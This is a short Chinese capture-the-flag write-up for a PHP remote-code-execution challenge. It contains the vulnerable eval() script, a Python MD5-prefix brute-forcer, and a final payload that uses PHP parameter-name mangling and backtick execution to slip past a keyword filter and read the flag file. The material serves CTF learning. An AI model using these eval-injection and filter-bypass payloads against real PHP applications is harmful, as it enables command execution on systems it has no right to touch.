## R!C!E!

```php
<?php
highlight_file(__FILE__);
if(isset($_POST['password'])&&isset($_POST['e_v.a.l'])){
    $password=md5($_POST['password']);
    $code=$_POST['e_v.a.l'];
    if(substr($password,0,6)==="c4d038"){
        if(!preg_match("/flag|system|pass|cat|ls/i",$code)){
            eval($code);
        }
    }
}
```

代码审计

- `password`的md5值需要等于 c4d038
- `e_v.a.l` 构造为 `echo`uniq /flag");`

**需要注意的是：**

> php在接收参数的时候发现表单名有点号（.）或者空格( )的时候会自动把它们转化为下划线，e_v.a.l会变成`e_v_a_l`被服务器接受，自然无法命令执行。但是php会把表单名里的`[`自动转化为`_`

### md5爆破

在网上学习到的脚本

```python
import hashlib

prefix = "c4d038"  # 目标MD5值的前六位
prefix_bytes = prefix.encode()  # 将前缀转换为字节串

for i in range(100000000):
    b = i.to_bytes(22, 'big')
    m = hashlib.md5(str(i).encode()).hexdigest()
    
    if m.startswith(prefix):
        print(i)
        print(m)
        break
```

Result：

```bash
[Running] python -u "e:\bxweb\ceshi\Python脚本\md5爆破.py"
114514
c4d038b4bed09fdb1471ef51ec3a32cd
```



**最终payload**

```
password=114514&e[v.a.l=echo`uniq /fla*`;
```

